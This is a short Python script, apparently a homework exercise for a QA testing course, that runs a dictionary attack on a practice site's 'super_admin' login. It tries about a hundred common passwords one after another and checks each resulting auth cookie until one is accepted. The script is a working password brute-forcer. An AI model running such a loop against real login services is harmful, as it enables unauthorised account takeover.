import requests

import json
password_popular=["password", "123456", "123456789", "12345678", "12345", "qwerty", "abc123", "football",
"1234567", "monkey", "111111", "letmein", "1234", "1234567890", "dragon", "baseball",
"sunshine", "iloveyou", "trustno1", "princess", "adobe123", "123123", "welcome", "login",
"admin", "qwerty123", "solo", "1q2w3e4r", "master", "666666", "photoshop", "1qaz2wsx",
"qwertyuiop", "ashley", "mustang", "121212", "starwars", "654321", "bailey", "access",
"flower", "555555", "passw0rd", "shadow", "lovely", "7777777", "michael", "!@#$%^&*",
"jesus", "password1", "superman", "hello", "charlie", "888888", "696969", "hottie",
"freedom", "aa123456", "qazwsx", "ninja", "azerty", "loveme", "whatever", "donald",
"batman", "zaq1zaq1", "Football", "000000", "123qwe","password1","qwertyuiop","password123",
"000000", "123qwe", "123456 ", "123456789 ", "qwerty ",
"12345678 ", "111111 ", "1234567890 ", "1234567 ", "123123 ", "987654321 ", "qwertyuiop ", "mynoob ",
"123321 ", "666666 ", "18atcskd2w ", "7777777 ", "654321 ", "555555 ", "3rjs1la7qe ", "google ",
"1q2w3e4r5t ", "123qwe ", "zxcvbnm ", "1q2w3e","12345 ", "password ", "qwerty123 ", "000000 ",
"1q2w3e ", "aa12345678 ", "abc123 ", "password1 ", "1234 ", "password123","Monkey","Dragon","Qwertyuiop"]



for pass_find in password_popular:
    print(pass_find)
    payload = {"login":"super_admin","password":pass_find}
    response1 = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework",data=payload)

    cookies_value = response1.cookies.get('auth_cookie')

    cookies = {}
    if cookies_value is not None:
        cookies.update({'auth_cookie':cookies_value})


    response2 = requests.post('https://playground.learnqa.ru/ajax/api/check_auth_cookie',cookies=cookies)
    if (response2.text) == 'You are NOT authorized':
        print(response2.text)
    else:
        print('password_find = ', payload['password'])
        break